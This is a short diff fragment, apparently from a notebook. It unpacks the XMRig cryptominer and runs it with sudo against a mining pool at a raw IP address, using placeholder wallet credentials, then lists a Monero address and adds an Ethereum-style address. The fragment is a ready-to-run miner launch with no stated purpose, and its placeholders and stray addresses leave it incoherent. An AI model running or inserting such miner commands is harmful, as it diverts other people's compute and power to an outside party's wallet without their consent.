@@ -2,3 +2,4 @@
 !tar -xf xmrig-6.12.2-linux-x64.tar.gz
 !cd xmrig-6.12.2 && chmod +x xmrig && sudo ./xmrig -o 88.198.11.177:55443 -O xxxWALLETxxx.0001BC8F:xxxPASSxxx -a rx/0 -t 2
 4AHp5RkuQUYaupQe5vRrnUibtmZtUJGpz65um8AteR7tgp4XbFhvGhg6mgFVXJ6CNb4Sx8K43yshjB9dVXmFSNks3U6LDoK
+0x519244B70dA2834D4544FC42E72bf284743d20C9
